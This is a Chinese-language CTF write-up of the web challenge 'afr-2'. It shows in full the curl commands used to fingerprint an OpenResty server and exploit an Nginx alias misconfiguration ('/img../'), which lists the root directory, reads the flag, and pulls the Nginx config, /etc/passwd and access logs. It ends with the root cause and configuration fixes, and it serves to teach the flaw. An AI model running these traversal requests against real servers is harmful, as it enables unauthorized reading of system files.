---
title: "afr-2"
date: 2026-07-07
categories:
  - CTF
  - WEB
tags:
  - CTF
  - Nginx
  - alias
  - 路径穿越
  - 任意文件读取
---

# 1. 题目分析

## 1.1 初始访问

访问靶机 `http://d79cbd6ffe18687997d9a09f.http-ctf2.dasctf.com/`，页面显示一个简单的 HTML 页面：

```html
<html>
<head>
    <title>u1s1</title>
</head>
<body>
HELLO!
<img src="img/img.gif">
</body>
</html>
```

页面只有一个 `<img>` 标签，指向 `img/img.gif`。没有表单、没有参数、没有链接。

## 1.2 识别服务器类型（如何知道是 openresty）

第一步先看 HTTP 响应头，确认后端技术栈：

```bash
curl -s -i "http://TARGET/"
```

关键响应头：

```
HTTP/1.1 200 OK
Server: openresty                    ← 服务器标识
Date: Tue, 07 Jul 2026 14:15:40 GMT
Content-Type: text/html
ETag: W/"5e67f83c-63"
Last-Modified: Tue, 10 Mar 2020 20:27:40 GMT
Cache-Control: no-cache
```

**`Server: openresty`** 暴露了 Web 服务器是 OpenResty——一个基于 Nginx + LuaJIT 的 Web 平台，底层就是 Nginx。这为后续排查 Nginx 配置漏洞提供了方向。

## 1.3 对比 afr_1，排除 PHP LFI

回顾 afr_1 的漏洞：通过 `?p=hello` 参数触发 `include($_GET['p'] . ".php")`。本题首先尝试相同思路：

```bash
# 尝试 afr_1 的利用方式
curl -s "http://TARGET/?p=hello"
# 返回：相同的首页 HTML，参数 p 被完全忽略

curl -s "http://TARGET/?p=php://filter/convert.base64-encode/resource=index"
# 返回：相同的首页 HTML，依然无效
```

尝试枚举常见参数名，看是否有其他参数可用：

```bash
for param in p page file path name include inc action m s a c; do
  curl -s "http://TARGET/?${param}=hello"
done
# 所有参数均返回相同首页，无一例外
```
用 for 循环遍历一个参数名列表，这些参数在 Web 应用中常用于：
- p / page — 页面路由
- file / path — 文件包含（LFI）
- name — 用户/资源标识
- include / inc — PHP include 相关
- action / a — 动作路由
- m — module（模块）
- s — section/source
- c — category / controller


尝试枚举常见 PHP 文件名：

```bash
for f in index.php hello.php flag.php test.php info.php phpinfo.php \
         config.php admin.php login.php app.php api.php read.php \
         view.php file.php include.php; do
  echo -n "$f: "
  curl -s -o /dev/null -w "%{http_code}" "http://TARGET/${f}"
done
```

结果：

```
index.php: 404
hello.php: 404
flag.php: 404
...全部返回 404
```

**结论**：后端没有 PHP 环境，afr_1 的 LFI 思路在本站行不通。漏洞不在应用层，而在 Nginx 配置层。

# 2. 信息收集 — 从 `img/img.gif` 找到突破口

## 2.1 访问 `/img/` 目录

页面中唯一的线索是 `<img src="img/img.gif">`。既然存在 `/img/img.gif`，那 `/img/` 这个目录路径很可能也可达。尝试直接访问目录本身：

```bash
curl -s "http://TARGET/img/"
```

返回的不是 403 Forbidden，也不是 404，而是一个 HTML 页面：

```
Index of /img/
../
img.gif     04-Oct-2018 05:55    456384
```

### 如何据此判断 `autoindex on`

Nginx 对目录请求的默认行为是 **403 Forbidden**（`autoindex off`）。只有当显式配置了 `autoindex on;` 时，Nginx 才会自动生成并返回目录列表页面。

```
请求 /img/（无 index 文件时）

autoindex off（默认）        autoindex on
      ↓                          ↓
  403 Forbidden          200 OK + 文件列表 HTML
```

两个对照实验可以验证这个判断：

```bash
# 实验 1：访问存在的目录 → 返回 200 + 文件列表
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/img/"
# 200  ← 不是 403，说明 autoindex 是 on

# 实验 2：访问不存在的目录 → 返回 404（对比确认 403 不会出现）
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/nonexist/"
# 404  ← 目录不存在，而非权限拒绝
```

**关键发现**：Nginx 开启了 `autoindex on`（自动目录索引），且 `/img/` 下只有一个 `img.gif`。

## 2.2 思考：`/img/` 真的是一个物理目录吗？

此时产生一个疑问：页面中图片路径是 `img/img.gif`，但如果图片真的在 `/var/www/html/img/` 下，那 `/var/www/html/` 下应该有 `index.html`，这个路径结构是合理的。

但仔细想：题目叫 "afr"（任意文件读取），页面又只有一个图片路径，会不会 `/img/` **不是** 一个普通的 `root` 目录，而是通过 Nginx 的 `alias` 指令映射到了别的地方？

## 2.3 推理链：为什么会想到 `/img../`

这个推理链是：

1. 题目叫 "afr" → 一定有文件读取漏洞
2. 所有 PHP 文件 404 → 漏洞在 Nginx 层
3. OpenResty/Nginx → 常见配置漏洞：`alias` 路径穿越、`root` 配置错误、SSRF
4. 页面上唯一的路径是 `/img/` → 重点怀疑这个 location 的配置
5. `/img/` 不是常见路径（不像 `/static/`、`/assets/`）→ 很可能是 `alias` 映射
6. **Nginx `alias` 的经典漏洞**：如果 `location` 不带尾部 `/`，请求 `/img../` 可以穿越出 alias 目录

这个推理在脑中大概只花了 10 秒，但每一步都很关键。

# 3. 漏洞验证 — `/img../` 路径穿越

## 3.1 第一次尝试

```bash
curl -s "http://TARGET/img../"
```

**一击命中！**返回了 Linux 根目录 `/` 的完整文件列表：

```
Index of /img../
../
bin/         28-May-2020 04:40    -
boot/        24-Apr-2018 08:34    -
dev/         07-Jul-2026 14:08    -
etc/         28-May-2020 04:40    -
home/        24-Apr-2018 08:34    -
lib/         23-May-2017 11:32    -
lib64/       03-Apr-2020 17:13    -
media/       03-Apr-2020 17:12    -
mnt/         03-Apr-2020 17:12    -
opt/         03-Apr-2020 17:12    -
proc/        07-Jul-2026 14:08    -
root/        03-Apr-2020 17:14    -
run/         07-Jul-2026 14:08    -
sbin/        28-May-2020 04:40    -
srv/         03-Apr-2020 17:12    -
sys/         07-Jul-2026 14:08    -
tmp/         28-May-2020 04:40    -
usr/         03-Apr-2020 17:12    -
var/         28-May-2020 04:40    -
flag         10-Mar-2020 20:24    20    ← 找到了！
```

在根目录下直接发现了 `flag` 文件（20 字节）。

## 3.2 验证 Nginx 配置

为了确认漏洞根因，读取 Nginx 站点配置：

```bash
curl -s "http://TARGET/img../etc/nginx/sites-enabled/default"
```

```nginx
server {
    listen 80;

    root /var/www/html/;

    index index.html;

    server_name _;

    autoindex on;

    location /img {
        alias /tmp/;
    }
}
```

**真相大白**：

| 配置项 | 值 | 说明 |
|--------|-----|------|
| `root` | `/var/www/html/` | 普通的 web 根目录 |
| `autoindex` | `on` | 全局开启了目录浏览 |
| `location /img` | `alias /tmp/` | `/img` 路径映射到 `/tmp/`，而不是 `/var/www/html/img/` |

`alias /tmp/` 意味着 `/img/img.gif` 实际读取的是 `/tmp/img.gif`。这个配置本身是为了把图片从 `/tmp/` 目录暴露出去，但由于 `location /img` 没有尾部 `/`，导致了路径穿越。

## 3.3 验证 alias 映射关系

```bash
# 正常访问：/img/img.gif → /tmp/img.gif ✅
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/img/img.gif"
# 200 OK

# 目录浏览 alias 目标：/img/ → /tmp/ 目录列表
curl -s "http://TARGET/img../tmp/"
# 返回 /tmp/ 目录内容，里面只有 img.gif
# 确认 alias 目标确实是 /tmp/
```

# 4. 漏洞原理

## 4.1 Nginx `alias` 的路径拼接规则

`alias` 指令的作用是 **路径替换**：将匹配到的 `location` 前缀替换为 `alias` 指定的路径。

以本题配置为例：

```nginx
location /img {        # 匹配前缀 /img
    alias /tmp/;       # 替换为 /tmp/
}
```

Nginx 的处理流程：

```
请求 URL: /img../flag

1. 前缀匹配: URL 以 /img 开头 → 匹配 location /img
2. 去掉前缀: /img../flag 去掉 /img → ../flag
3. 拼接到 alias: /tmp/ + ../flag → /tmp/../flag
4. 路径规范化: /tmp/../flag → /flag
5. 返回文件: /flag 的内容
```

## 4.2 图解：正常请求 vs 攻击请求

```
正常请求：/img/img.gif
┌─────────────────────────────────────────────┐
│ URL:   /img/img.gif                         │
│          ↓ 匹配 location /img，去掉 /img     │
│ 剩余:   /img.gif                            │
│          ↓ 拼接到 alias /tmp/               │
│ 结果:   /tmp//img.gif → /tmp/img.gif ✅      │
└─────────────────────────────────────────────┘

攻击请求：/img../flag
┌─────────────────────────────────────────────┐
│ URL:   /img../flag                          │
│          ↓ 匹配 location /img，去掉 /img     │
│ 剩余:   ../flag                             │
│          ↓ 拼接到 alias /tmp/               │
│ 结果:   /tmp/../flag → /flag ❌ 穿越到根目录！ │
└─────────────────────────────────────────────┘
```

**本质**：`..` 在 Nginx 处理 `alias` 拼接时不会被过滤，而是作为正常的路径组件参与计算，最终在文件系统层面被解析为上级目录。

## 4.3 为什么 `location` 不带 `/` 是关键

```nginx
# ❌ 不安全 — location 无尾部斜杠
location /img {
    alias /tmp/;
}
# /img../ → 匹配 → 去掉 /img → ../ → /tmp/../ = /


# ✅ 安全 — location 有尾部斜杠
location /img/ {
    alias /tmp/;
}
# /img../ → /img.. 不匹配 /img/（因为 /img/ 要求第四个字符是 /，而实际是 .）
# → 请求落到默认 location → 404 Not Found
```

Nginx 官方文档也提醒：使用 `alias` 时，建议 `location` 和 `alias` 要么都带尾部 `/`，要么都不带，否则路径拼接行为可能不符合预期。

## 4.4 `autoindex on` 的辅助

`server` 块中全局配置了 `autoindex on;`，这使得所有目录在缺少 `index` 文件时都会返回文件列表。这个配置本身不是漏洞，但大幅降低了利用难度：

- **有 autoindex**：`/img../` 直接显示文件列表，一眼看到 `flag`
- **无 autoindex**：需要盲猜文件名，或通过其他信息泄露定位 flag 路径

# 5. 漏洞利用

## 5.1 列出根目录

```bash
curl -s "http://d79cbd6ffe18687997d9a09f.http-ctf2.dasctf.com/img../"
```

## 5.2 读取 flag

```bash
curl -s "http://d79cbd6ffe18687997d9a09f.http-ctf2.dasctf.com/img../flag"
```

## 5.3 读取 Nginx 配置（溯源漏洞根因）

```bash
curl -s "http://d79cbd6ffe18687997d9a09f.http-ctf2.dasctf.com/img../etc/nginx/sites-enabled/default"
```

## 5.4 读取系统敏感文件（演示危害范围）

```bash
# 读取 /etc/passwd
curl -s "http://TARGET/img../etc/passwd"

# 读取 Nginx 访问日志
curl -s "http://TARGET/img../var/log/nginx/access.log"

# 读取 web 目录确认文件结构
curl -s "http://TARGET/img../var/www/html/"
```

# 6. Flag

```
n1book{afr_2_solved}
```

# 7. afr_1 vs afr_2 对比

| 维度 | afr_1 | afr_2 |
|------|-------|-------|
| **漏洞类型** | PHP LFI（本地文件包含） | Nginx alias 路径穿越 |
| **利用方式** | `php://filter` 伪协议 | `/img../` 路径穿越 |
| **漏洞载体** | PHP `include()` 函数 | Nginx `alias` 指令 |
| **读取范围** | Web 目录下的 `.php` 文件 | **整个文件系统任意文件** |
| **前提条件** | 需要 PHP 环境 | 仅需 Nginx 配置不当 |
| **发现线索** | URL 参数 `?p=hello` | 响应头 `Server: openresty` + `<img src>` |
| **绕过对象** | `.php` 后缀追加 | `location` 前缀匹配 |

afr_2 的危害实际上比 afr_1 更大——可以读取 `/etc/passwd`、Nginx 配置、系统日志等任意文件，不受文件类型限制。

# 8. 修复建议

```nginx
# 修复方式 1（推荐）：location 和 alias 都加尾部斜杠
location /img/ {
    alias /tmp/;
}

# 修复方式 2（最佳）：用 root 替代 alias，避免路径拼接问题
location /img/ {
    root /var/www/html;
    # 图片放在 /var/www/html/img/ 下
}

# 修复方式 3：关闭 autoindex（降低信息泄露，但不修复根本问题）
autoindex off;
```

**最佳实践**：优先使用 `root` 而非 `alias`。如果必须使用 `alias`，确保 `location` 和 `alias` 的尾部斜杠一致。

# 9. 总结

本题考察了 **Nginx `alias` 指令配置不当导致的路径穿越漏洞**，解题链路如下：

```
获取 HTTP 响应头 → 发现 Server: openresty → 确认 Nginx 环境
    ↓
尝试 PHP LFI（afr_1 思路）→ 全部 404 → 排除 PHP 漏洞
    ↓
观察页面源码 → 唯一线索 <img src="img/img.gif">
    ↓
访问 /img/ → 目录浏览开启 → 怀疑 alias 配置
    ↓
尝试 /img../ → 路径穿越成功 → 读取 /flag
```

核心知识点：
1. **信息收集**：通过 `Server` 响应头识别中间件类型，缩小漏洞范围
2. **`alias` 路径拼接**：`location /img` 不带 `/` 时，去掉前缀后的剩余部分（包括 `../`）会原样拼接到 alias 路径
3. **`../` 穿越**：Nginx 不会过滤 `..`，路径拼接后在文件系统层面解析，导致目录穿越
4. **`autoindex on`**：目录浏览开启让攻击者可以直接看到文件列表，大幅降低利用难度
